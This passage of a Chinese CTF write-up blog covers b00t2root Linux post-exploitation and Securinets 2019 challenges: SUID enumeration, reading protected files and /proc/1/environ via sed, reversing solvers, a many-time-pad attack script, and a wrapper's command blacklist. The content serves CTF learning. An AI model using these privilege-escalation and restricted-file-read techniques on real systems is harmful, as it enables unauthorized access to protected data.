Mar 29 15:30 ..-rw-r--r-- 1 tony  root   220 Mar 29 15:30 .bash_logout-rw-r--r-- 1 tony  root  3771 Mar 29 15:30 .bashrcdrwx------ 2 tony  root  4096 Mar 31 11:38 .cache---------- 1 tony  root    38 Mar 29 15:28 .flag-rw-r--r-- 1 tony  root   807 Mar 29 15:30 .profiledrwxrwxr-x 2 steve steve 4096 Mar 31 11:37 .ssh-rw-rw-r-- 1 steve steve    0 Mar 31 11:34 anythingtony@e2797a47d8f5:~$ cat .flagcat: .flag: Permission denied</code></pre><p>变成 tony 后，发现依然无法查看，因为无论是哪个用户，对 <code>.flag</code> 文件没有任何权限。我们尝试进行<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">提权</a>：</p><pre><code class="bash">tony@e2797a47d8f5:~$ find / -perm -u=s -type f 2&gt;/dev/null/bin/sed/bin/mount/bin/umount/bin/su/usr/bin/gpasswd/usr/bin/passwd/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign</code></pre><blockquote><p>注：在类 Unix 系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据，读取它则会立即得到一个 EOF。 在程序员行话，尤其是 Unix 行话中，/dev/null 被称为比特桶或者黑洞。</p></blockquote><p>查找到一些我们能够执行并获取更高权限的一些命令，涉及到一些 <a href="https://www.linux.com/blog/what-suid-and-how-set-suid-linuxunix" target="_blank" rel="noopener">SUID 的知识</a>。</p><pre><code class="bash">steve@d18fb074a417:~$ ls -l /bin/sed-rwxrwx--- 1 root  root  109000 Jan 30 2018 /bin/sedsteve@d18fb074a417:~$ /bin/sed-su: /bin/sed: Permission deniedtony@e2797a47d8f5:~$ iduid=1001(tony) gid=0(root) groups=0(root)</code></pre><p>我们发现 steve 是无法执行 <code>/bin/sed</code> 的，然而 tony 在 root 这个用户组中，是可以执行的。了解一下<a href="https://gtfobins.github.io/gtfobins/sed/#file-read" target="_blank" rel="noopener">如何通过 sed 查看文件</a>（在上个礼拜的 Securinets 中也有涉及），然后就能拿到 flag：</p><pre><code class="bash">tony@e2797a47d8f5:~$ /bin/sed &#39;&#39; .flagb00t2root{1_h0p3_ssh_15_th3_0nly_w4y}</code></pre><h1 id="Groot（LINUX-Post-Exploitation）"><a href="#Groot（LINUX-Post-Exploitation）" class="headerlink" title="Groot（LINUX Post-Exploitation）"></a>Groot（LINUX Post-Exploitation）</h1><p>We know Groot’s no more but we can still hear him in the environment. Can you?</p><p>根据提示可以知道 flag 基本上是在环境变量里：</p><pre><code class="bash">tony@e2797a47d8f5:~$ envLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:SSH_CONNECTION=127.0.0.1 57394 127.0.0.1 22USER=tonyPWD=/home/tonyHOME=/home/tonySSH_CLIENT=127.0.0.1 57394 22SSH_TTY=/dev/pts/1MAIL=/var/mail/tonyTERM=xtermSHELL=/bin/bashSHLVL=1LOGNAME=tonyPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games_=/usr/bin/env</code></pre><p>还是在 <code>/proc/1/</code> 下查看 <code>environ</code>，没有权限。因为我们现在是 tony，直接用 sed 就能查看，得到 flag：</p><pre><code class="bash">tony@e2797a47d8f5:~$ ps -auxUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot         1  0.0  0.0  18376  3044 pts/0    Ss   11:28   0:00 bash /tmp/42.shroot        14  0.0  0.0  72296  3356 ?        Ss   11:28   0:00 /usr/sbin/sshdroot        16  0.0  0.0  55952  3300 pts/0    S    11:28   0:00 su -l stevesteve       18  0.0  0.0  18508  3412 pts/0    S    11:28   0:00 -susteve       64  0.0  0.0  45188  5572 pts/0    S+   11:56   0:00 ssh -i /home/stroot        65  0.0  0.0 103852  7340 ?        Ss   11:56   0:00 sshd: tony [pritony        80  0.0  0.0 103852  3528 ?        R    11:56   0:00 sshd: tony@pts/tony        81  0.0  0.0  18508  3500 pts/1    Ss   11:56   0:00 -bashtony        91  0.0  0.0  36700  3140 pts/1    R+   11:58   0:00 ps -auxtony@e2797a47d8f5:~$ cat /proc/1/environcat: /proc/1/environ: Permission deniedtony@e2797a47d8f5:~$ sed &#39;&#39; /proc/1/environPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=e2797a47d8f5TERM=xtermflag=b00t2root{1_44aaaaaammmm_gr0000000ooooooOOO7777}HOME=/root</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=68Tgdx_Y8ng" target="_blank" rel="noopener">https://www.youtube.com/watch?v=68Tgdx_Y8ng</a><br><a href="https://www.youtube.com/watch?v=Qg3qOjylZpw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Qg3qOjylZpw</a><br><a href="https://www.youtube.com/watch?v=RmGl1mje1Ho" target="_blank" rel="noopener">https://www.youtube.com/watch?v=RmGl1mje1Ho</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019-Securinets-CTF-Quals</title>
    <link href="/2019/03/25/2019-Securinets-CTF-Quals/"/>
    <url>/2019/03/25/2019-Securinets-CTF-Quals/</url>
    
    <content type="html"><![CDATA[<p>比赛的时候做了四道题，顺便复现几道没做出来的题目。</p><p><img src="/pics/2019-Securinets-CTF-Quals/1.png" srcset="/img/loading.gif" alt></p><a id="more"></a><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="AutomateMe"><a href="#AutomateMe" class="headerlink" title="AutomateMe"></a>AutomateMe</h2><pre><code class="bash">root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# file ./bin./bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=cbafec6cc96cbdd6feea8085adeeafb3fc05c11f, not stripped</code></pre><p>用 radare2 分析一下：</p><pre><code>root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# radare2 ./bin -- Execute commands on a temporary offset by appending &#39;@ offset&#39; to your command.[0x000005d0]&gt; aaa[Invalid instruction of 16368 bytes at 0x124 entry0 (aa)Invalid instruction of 16366 bytes at 0x124[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)...[x] Type matching analysis for all functions (aaft)[x] Use -AA or aaaa to perform additional experimental analysis.[0x000005d0]&gt; s main[0x000006da]&gt; pdfLinear size differs too much from the bbsum, please use pdr instead.[0x000006da]&gt; pdrDo you want to print 1316 lines? (y/N) y...| 0x00000786      3c68           cmp al, 0x68                          ; &#39;h&#39;| ; DATA XREF from main (+0x173d3)| 0x00000788      7416           je 0x7a0| ----------- true: 0x000007a0  false: 0x0000078a| ; DATA XREF from main (+0x1742f)| 0x0000078a      488d3de57c02.  lea rdi, str.nope_:                   ; 0x28476 ; &quot;nope :( &quot; ; const char *format| ; DATA XREF from main (+0x1758d)| 0x00000791      b800000000     mov eax, 0| ; DATA XREF from main (+0x17681)| 0x00000796      e815feffff     call sym.imp.printf                   ; int printf(const char *format)| ; DATA XREF from main (+0x1776e)| 0x0000079b      e9007c0200     jmp 0x283a0...</code></pre><p>在 <code>0x00000786</code> 处可以看到将输入的某个字符与 <code>h</code> 进行了比较。</p><pre><code>...| ----------- true: 0x000283a0| ; CODE XREF from main (0x788)| ; DATA XREF from main (+0x17869)| 0x000007a0      488b45e0       mov rax, qword [s]| ; DATA XREF from main (+0x17928)| 0x000007a4      4883c008       add rax, 8| ; DATA XREF from main (+0x179e7)| 0x000007a8      488b00         mov rax, qword [rax]| ; DATA XREF from main (+0x17a86)| 0x000007ab      0fb64002       movzx eax, byte [rax + 2]             ; [0x2:1]=76| ; DATA XREF from main (+0x17b4c)| 0x000007af      8845ff         mov byte [local_1h], al| ; DATA XREF from main (+0x17bdd)| 0x000007b2      8075ffeb       xor byte [local_1h], 0xeb| ; DATA XREF from main (+0x17ca3)| 0x000007b6      807dff8e       cmp byte [local_1h], 0x8e| ; DATA XREF from main (+0x17d70)| 0x000007ba      7416           je 0x7d2...</code></pre><p>往下看变得复杂了一些，将输入和 <code>0xeb</code> 异或了一下再与 <code>0x8e</code> 比较，故这里的字符是 <code>chr(0xeb^0x8e)=&#39;e&#39;</code>。</p><p>事实证明，这道题用 Ghidra 很方便。这个文件的 main 函数非常大，ida 都没法反编译。Ghidra 可以快速地分析，然后我们通过 python 正则匹配一下就能得到 flag：</p><p><img src="/pics/2019-Securinets-CTF-Quals/2.png" srcset="/img/loading.gif" alt></p><p>正则匹配：</p><pre><code class="python">#!/usr/bin/env pythonimport rewith open(&#39;bin.c&#39;, &#39;rb&#39;) as f:    txt = f.read()    regex = re.compile(r&#39;\&#39;(.*)\&#39;&#39;)    # print regex.findall(txt)    output = &#39;&#39;    for c in regex.findall(txt):        output += c    print output</code></pre><p>输出 flag：</p><pre><code class="bash">$ ./solve.py | grep -E &quot;flag|securinets&quot;... here is you flag securinets{automating_everything_is_the_new_future} ...</code></pre><h2 id="Warmup-Welcome-to-securinets-CTF"><a href="#Warmup-Welcome-to-securinets-CTF" class="headerlink" title="Warmup: Welcome to securinets CTF!"></a>Warmup: Welcome to securinets CTF!</h2><pre><code>root@91120f278fdd:~/ctf/2019-Securinets/re/warmup# file warmupwarmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=93a17fbbf5e51001a87144a35c32ea813c43cbf4, stripped</code></pre><p>ltrace 一下，大概能看出做了什么：</p><pre><code class="bash">root@91120f278fdd:~/ctf/2019-Securinets# ltrace ./warmupputs(&quot;Welcome to securinets quals CTF &quot;...Welcome to securinets quals CTF :))                                                 = 35printf(&quot;PASSCODE:&quot;)                                                                         = 9fgets(PASSCODE:ABC123&quot;ABC123\n&quot;, 100, 0x7f6912b8aa00)                                                      = 0x55e762c220e0strlen(&quot;ABC123\n&quot;)                                                                          = 7...malloc(137)                                                                                 = 0x55e763504a80strlen(&quot;QUJDMTIzCgCA/gMAcP4AADhpAAABABBp&quot;...)                                               = 136...strlen(&quot;QUJDMTIz&quot;)                                                                          = 8strlen(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef&quot;...)                                               = 62...puts(&quot;NOPE :( &quot;NOPE :()                                                                            = 9exit(0 &lt;no return ...&gt;+++ exited (status 0) +++</code></pre><p>放进 ida 里看看 main 函数：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  int length; // eax  _BOOL4 v4; // ebx  int v5; // ebx  int v6; // ebx  int v7; // ebx  int v8; // ebx  int v9; // ebx  int v10; // ebx  int v11; // ebx  int v12; // ebx  int v13; // ebx  int v14; // ebx  int v15; // ebx  int v16; // ebx  int v17; // ebx  int v18; // ebx  int v19; // ebx  int v20; // ebx  int v21; // ebx  int v22; // ebx  int v23; // ebx  int v24; // ebx  int v25; // ebx  int v26; // ebx  int v27; // ebx  int i; // [rsp+8h] [rbp-1C8h]  int j; // [rsp+Ch] [rbp-1C4h]  char *s; // [rsp+18h] [rbp-1B8h]  int v32[102]; // [rsp+20h] [rbp-1B0h]  unsigned __int64 v33; // [rsp+1B8h] [rbp-18h]  v33 = __readfsqword(0x28u);  puts(&quot;Welcome to securinets quals CTF :)&quot;);  printf(&quot;PASSCODE:&quot;, a2);  fgets(passcode, 100, stdin);  for ( i = 0; i &lt; strlen(passcode); ++i )    v32[i] = passcode[i];  length = sub_89A(0x64u);  s = (char *)malloc(length + 1);  base64_encode((__int64)v32, 0x64u, (__int64)s);  for ( j = 0; j &lt; strlen(s) &amp;&amp; s[j] != &#39;C&#39;; ++j )    base64_string[j] = s[j];  base64_string[strlen(base64_string)] = 0;  v4 = sub_B88(base64_string);  v5 = (unsigned __int64)sub_C07(base64_string) + v4;  v6 = (unsigned __int64)sub_C68((__int64)base64_string) + v5;  v7 = (unsigned __int64)sub_E25(base64_string) + v6;  v8 = (unsigned __int64)sub_C90(base64_string) + v7;  v9 = (unsigned __int64)sub_CAD(base64_string) + v8;  v10 = (unsigned __int64)sub_CDA(base64_string) + v9;  v11 = (unsigned __int64)sub_DA8(base64_string) + v10;  v12 = (unsigned __int64)sub_DF4(base64_string) + v11;  v13 = (unsigned __int64)sub_E6E(base64_string) + v12;  v14 = (unsigned __int64)sub_ECA(base64_string) + v13;  v15 = (unsigned __int64)sub_EF7(base64_string) + v14;  v16 = (unsigned __int64)sub_F53(base64_string) + v15;  v17 = (unsigned __int64)sub_FAF(base64_string) + v16;  v18 = (unsigned __int64)sub_E51(s) + v17;  v19 = (unsigned __int64)sub_107E(base64_string) + v18;  v20 = (unsigned __int64)sub_10AF(base64_string) + v19;  v21 = (unsigned __int64)sub_10E0(base64_string) + v20;  v22 = (unsigned __int64)sub_10FD(base64_string) + v21;  v23 = (unsigned __int64)sub_112A(base64_string) + v22;  v24 = (unsigned __int64)sub_11FB(base64_string) + v23;  v25 = (unsigned __int64)sub_1234(base64_string) + v24;  v26 = (unsigned __int64)sub_1287(base64_string) + v25;  v27 = (unsigned __int64)sub_12B6(base64_string) + v26;  if ( v27 + (unsigned int)sub_1309(base64_string) == 25 )  {    puts(&quot;Good job! u know what to do and submit!&quot;);  }  else  {    puts(&quot;NOPE :(&quot;);    free(s);  }  return 0LL;}</code></pre><p>一开始做了一个 base64，然后一系列的没有规律的加密，我们所需要做的是耐心地倒退出来就行了。脚本：</p><pre><code class="python">#!/usr/bin/env pythonimport base64def pos(x,y):    for i in range(len(y)):        if y[i] == x:            return itable = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;enc = [0] * 36enc[0] = ord(table[28])enc[3] = ord(&#39;j&#39;)enc[4] = enc[0] + 1enc[12] = enc[4] - 1enc[22] = enc[4] - 1enc[24] = enc[4] - 1enc[1] = ord(table[54])enc[2] = ord(table[((28 + pos(chr(enc[1]), table)) &gt;&gt; 2) + 1])enc[10] = enc[2]enc[6] = enc[3] - 32enc[7] = ord(&#39;p&#39;)enc[11] = 48enc[23] = 48enc[35] = enc[11] + 9enc[8] = enc[0] - 1enc[27] = enc[4] + 2enc[31] = enc[27]enc[9] = enc[27] + 7enc[25] = enc[27] + 7enc[13] = enc[1] + 1enc[17] = enc[1] + 1enc[21] = enc[1] + 1enc[15] = enc[7] + 3enc[14] = enc[15] + 1enc[19] = ord(&#39;z&#39;)enc[34] = enc[0] - 33enc[5] = 88enc[20] = 88enc[29] = 88enc[33] = 88enc[26] = 49enc[16] = enc[9] - 32enc[28] = enc[16]enc[18] = enc[7] - 30enc[30] = enc[18]enc[32] = enc[4]flag = &#39;&#39;for i in enc:    flag += chr(i)flag = base64.b64decode(flag)print &#39;flag:&#39;, flag</code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="Useless-Admin"><a href="#Useless-Admin" class="headerlink" title="Useless Admin"></a>Useless Admin</h1><p>题目说明了是 OTP（一次一密），并且给了一个 json，里面有用同一个密钥加密的不同密文，以及同样被加密的 flag。</p><pre><code class="json">{  &quot;cipher_list&quot;: [&quot;1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940&quot;, &quot;1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f&quot;, &quot;1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d&quot;, &quot;160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f&quot;, &quot;1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c&quot;, &quot;1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e&quot;, &quot;1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347&quot;, &quot;0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42&quot;, &quot;160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542&quot;, &quot;1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b&quot;, &quot;1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40&quot;],  &quot;cipher_flag&quot;: &quot;1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b&quot;}</code></pre><p>同时我找到了一篇 <a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/" target="_blank" rel="noopener">2017 年 AlexCTF 中类似的 writeup</a>，用的是 github 上的一个 <a href="https://raw.githubusercontent.com/Jwomers/many-time-pad-attack/master/attack.py" target="_blank" rel="noopener">attack 脚本</a>。</p><pre><code class="python">#!/usr/bin/env python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# @author intrd - http://dann.com.br/# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = &#39;1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940&#39;c2 = &#39;1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f&#39;c3 = &#39;1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d&#39;c4 = &#39;160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f&#39;c5 = &#39;1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c&#39;c6 = &#39;1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e&#39;c7 = &#39;1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347&#39;c8 = &#39;0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42&#39;c9 = &#39;160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542&#39;c10 = &#39;1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b&#39;c11 = &#39;1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40&#39;ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to cracktarget_cipher = &#39;1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b&#39;# XORs two stringdef strxor(a, b):     # xor two strings (trims the longer input)    return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])# To store the final keyfinal_key = [None]*300# To store the positions we know are brokenknown_key_positions = set()# For each ciphertextfor current_index, ciphertext in enumerate(ciphers):    counter = collections.Counter()    # for each other ciphertext    for index, ciphertext2 in enumerate(ciphers):        if current_index != index: # don&#39;t xor a ciphertext with itself            for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#39;hex&#39;), ciphertext2.decode(&#39;hex&#39;))): # Xor the two ciphertexts                # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#39;t know which one)                if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index    knownSpaceIndexes = []    # Loop through all positions where a space character was possible in the current_index cipher    for ind, val in counter.items():        # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!        if val &gt;= 7: knownSpaceIndexes.append(ind)    #print knownSpaceIndexes # Shows all the positions where we now know the key!    # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!    xor_with_spaces = strxor(ciphertext.decode(&#39;hex&#39;),&#39; &#39;*300)    for index in knownSpaceIndexes:        # Store the key&#39;s value at the correct position        final_key[index] = xor_with_spaces[index].encode(&#39;hex&#39;)        # Record that we known the key at this position        known_key_positions.add(index)# Construct a hex key from the currently known key, adding in &#39;00&#39; hex chars where we do not know (to make a complete hex string)final_key_hex = &#39;&#39;.join([val if val is not None else &#39;00&#39; for val in final_key])# Xor the currently known key with the target cipheroutput = strxor(target_cipher.decode(&#39;hex&#39;),final_key_hex.decode(&#39;hex&#39;))print &quot;Fix this sentence:&quot;print &#39;&#39;.join([char if index in known_key_positions else &#39;*&#39; for index, char in enumerate(output)])+&quot;\n&quot;# WAIT.. MANUAL STEP HERE# This output are printing a * if that character is not known yet# fix the missing characters like this: &quot;Let*M**k*ow if *o{*a&quot; = &quot;cure, Let Me know if you a&quot;# if is too hard, change the target_cipher to another one and try again# and we have our key to fix the entire text!#sys.exit(0) #comment and continue if u got a good key#target_plaintext = &quot;cure, Let Me know if you a&quot;target_plaintext = &quot;i wanted to end the world, but i&#39;ll settle for ending yours.&quot;print &quot;Fixed:&quot;print target_plaintext+&quot;\n&quot;key = strxor(target_cipher.decode(&#39;hex&#39;),target_plaintext)print &quot;Decrypted msg:&quot;for cipher in ciphers:    print strxor(cipher.decode(&#39;hex&#39;),key)print &quot;\nPrivate key recovered: &quot;+key+&quot;\n&quot;</code></pre><p>具体原理应该就是异或了，只需要想办法复原 key 即可。我还找到一个 <a href="https://github.com/CameronLonsdale/MTP" target="_blank" rel="noopener">cli 工具</a>，让还原 key 更简单，截图如下：</p><p><img src="/pics/2019-Securinets-CTF-Quals/3.png" srcset="/img/loading.gif" alt></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>给了个 ssh，然后无法执行 welcome 以及查看 flag.txt：</p><pre><code class="shell">$ pwd/home/welcome$ whoamiwelcome$ ls -altotal 56dr-xr-xr-x   2 welcome         welcome          4096 Mar 23 20:23 .drwxr-xr-x  22 root            root             4096 Mar 24 10:18 ..-rw-r--r--   1 root            root                0 Mar 25 02:13 .bash_history-rw-r--r--   1 welcome         welcome             0 Mar 24 00:22 .bash_logout-rw-r--r--   1 welcome         welcome             1 Mar 24 13:33 .bashrc-rw-r--r--   1 welcome         welcome           655 May 16  2017 .profile-r--------   1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt-r--------+  1 welcome-cracked welcome          8712 Mar 23 19:09 welcome-rw-r-----   1 root            root              175 Mar 23 12:27 welcome.c-r-s--x---   1 welcome-cracked welcome         13088 Mar 23 20:13 wrapper-rw-r--r--   1 root            root             1741 Mar 23 20:13 wrapper.c</code></pre><p>wrapper 是可以执行的，源码也能查看，可以大致看看做了什么：</p><pre><code class="cpp">/* author : Anis_Boss */#include &lt;stdio.h&gt;int search(char str[], char word[]){    int l, i, j;    /*length of word */   for (l = 0; word[l] != &#39;\0&#39;; l++);    for (i = 0, j = 0; str[i] != &#39;\0&#39; &amp;&amp; word[j] != &#39;\0&#39;; i++)    {        if (str[i] == word[j])        {            j++;        }        else        {            j = 0;        }    }    if (j == l)    {        /* substring found */        return (i - j);    }    else    {        return  - 1;    }}int delete_word(char str[], char word[], int index){    int i, l;    /* length of word */    for (l = 0; word[l] != &#39;\0&#39;; l++);    for (i = index; str[i] != &#39;\0&#39;; i++)    {        str[i] = str[i + l + 1];    }}void main(int argc, char* argv[]){char * blacklist[]={&quot;cat&quot;,&quot;head&quot;,&quot;less&quot;,&quot;more&quot;,&quot;cp&quot;,&quot;man&quot;,&quot;scp&quot;,&quot;xxd&quot;,&quot;dd&quot;,&quot;od&quot;,&quot;python&quot;,&quot;perl&quot;,&quot;ruby&quot;,&quot;tac&quot;,&quot;rev&quot;,&quot;xz&quot;,&quot;tar&quot;,&quot;zip&quot;,&quot;gzip&quot;,&quot;mv&quot;,&quot;flag&quot;,&quot;txt&quot;,&quot;python&quot;,&quot;perl&quot;,&quot;vi&quot;,&quot;vim&quot;,&quot;nano&quot;,&quot;pico&quot;,&quot;awk&quot;,&quot;grep&quot;,&quot;egrep&quot;,&quot;echo&quot;,&quot;find&quot;,&quot;exec&quot;,&quot;eval&quot;,&quot;regexp&quot;,&quot;tail&quot;,&quot;head&quot;,&quot;less&quot;,&quot;cut&quot;,&quot;tr&quot;,&quot;pg&quot;,&quot;du&quot;,&quot;`&quot;,&quot;$&quot;,&quot;(&quot;,&quot;)&quot;,&quot;#&quot;,&quot;bzip2&quot;,&quot;cmp&quot;,&quot;split&quot;,&quot;paste&quot;,&quot;diff&quot;,&quot;fgrep&quot;,&quot;gawk&quot;,&quot;iconv&quot;,&quot;ln&quot;,&quot;most&quot;,&quot;open&quot;,&quot;print&quot;,&quot;read&quot;,&quot;{&quot;,&quot;}&quot;,&quot;sort&quot;,&quot;uniq&quot;,